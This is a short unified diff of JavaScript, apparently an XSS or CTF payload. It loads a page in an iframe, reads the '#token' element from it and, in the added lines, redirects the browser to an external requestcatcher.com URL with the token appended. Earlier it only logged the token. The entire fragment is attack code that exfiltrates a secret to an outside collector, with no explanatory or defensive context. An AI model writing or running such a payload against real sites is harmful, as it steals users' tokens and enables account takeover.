@@ -6,6 +6,6 @@ body1.appendChild(ifr)
 
 setTimeout(() => {
   const token = ifr.contentWindow.document.querySelector("#token")
-  console.log(token)
-}, 3000)
+  window.location.href = `https://yt54h.requestcatcher.com/${token}`
+}, 2000)
 
